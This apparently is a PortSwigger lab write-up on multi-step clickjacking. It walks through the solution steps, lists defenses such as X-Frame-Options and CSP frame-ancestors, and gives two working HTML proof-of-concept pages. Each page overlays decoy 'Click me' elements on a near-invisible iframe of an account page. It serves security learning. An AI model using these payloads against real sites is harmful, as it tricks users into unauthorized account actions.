# **Clickjacking with Multi-Step User Interaction**

🔍 **Challenge:**  
Exploit a clickjacking vulnerability requiring multiple user clicks to perform unauthorized actions.

---

## 🛠️ **Solution**  

### 1. **Target Analysis:**  
- Investigated a "My Account" page vulnerable to clickjacking.  
- Identified multi-step interactions for triggering unauthorized actions, such as changing user settings.

### 2. **Exploit Crafting:**  
- Designed an HTML page embedding the target URL in an iframe.  
- Used decoy clickable elements styled as prompts for the victim to interact with.  
- Strategically aligned these decoy elements over the clickable target buttons in the iframe.

### 3. **Positioning and Styling:**  
- Applied styles to the iframe to make it nearly invisible (`opacity: 0.0001`).  
- Positioned the iframe precisely to align with the "Click me first" and "Click me next" actions required by the target.  
- Adjusted iframe size and placement to mimic legitimate actions.

### 4. **Execution:**  
- Hosted the exploit page and shared it with the victim.  
- The victim's interaction triggered the unauthorized action sequence in the iframe.  

---

## 🔑 **Takeaways**  

- **Implement X-Frame-Options:** Protect pages with sensitive actions using headers like `X-Frame-Options: DENY`.  
- **Adopt Content-Security-Policy:** Specify `frame-ancestors 'none';` to prevent embedding in iframes.  
- **Secure Multi-Step Processes:** Ensure user confirmation for each step to mitigate unauthorized action chains.

---

## 💻 **Proof of Concept (PoC)**

### **My Custom PoC**

```html
<style>
    iframe {
        position: relative;
        width: 1000px;
        height: 900px;
        opacity: 0.1;
        z-index: 2;
    }
    #clickme {
        position: absolute;
        top: 510px;
        left: 50px;
        z-index: 1;
    }
    #clickmenext {
        position: absolute;
        top: 310px;
        left: 200px;
        z-index: 1;
    }
</style>

<div id="clickme">Click me first</div>
<div id="clickmenext">Click me next</div>
<iframe src="https://0a02000004d7a00f8069cb0300bd0002.web-security-academy.net/my-account"></iframe>
```



### **PortSwigger Lab PoC**

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    .firstClick, .secondClick {
        position: absolute;
        top: 330px;
        left: 50px;
        z-index: 1;
    }
    .secondClick {
        top: 285px;
        left: 225px;
    }
</style>

<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a02000004d7a00f8069cb0300bd0002.web-security-academy.net/my-account"></iframe>
``` 

✔️ Successfully completed the Multi-Step Clickjacking Lab! 🛡️

💡 This lab demonstrated how carefully aligned decoy elements can exploit clickjacking vulnerabilities requiring multi-step user interactions.
Key Lessons:

1️⃣ Use robust headers like X-Frame-Options and Content-Security-Policy to secure web applications.
2️⃣ Ensure sensitive actions are accompanied by strong user intent verification.

![Clickjacking with Multi-Step User Interaction](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/csrf-lab16a.PNG) 
